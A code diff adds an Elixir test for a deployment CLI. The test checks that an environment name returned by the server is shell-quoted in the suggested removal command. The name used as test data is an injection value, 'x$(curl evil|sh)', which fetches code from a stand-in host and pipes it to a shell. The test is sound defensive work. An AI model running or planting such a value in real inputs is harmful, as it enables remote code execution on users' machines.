@@ -467,6 +467,23 @@ defmodule Ehosctl.DeployBuildTest do
       assert requests(provider) == []
     end
 
+    test "quotes for a shell the name EHOS gives the environment it created, in the command to remove it",
+         %{provider: provider, opts: opts} do
+      no_environment(provider, "ledger-try")
+      created(provider, 201, %{"environment" => %{@created | "name" => "x$(curl evil|sh)"}})
+      answer(provider, 409, %{"error" => "no_room", "message" => "The quota has no room."})
+
+      {1, "", stderr} = ehosctl(create_env("ledger-try", []), opts)
+
+      assert stderr |> String.split("\n") |> Enum.take(-2) ==
+               [
+                 "The ephemeral environment x$(curl evil|sh), which ehosctl created for the " <>
+                   "deployment, stays until it expires. Run `ehosctl env remove 'x$(curl evil|sh)'` " <>
+                   "to remove it.",
+                 ""
+               ]
+    end
+
     test "when EHOS refuses the deployment, says that the environment it created stays",
          %{provider: provider, opts: opts} do
       no_environment(provider, "ledger-try")
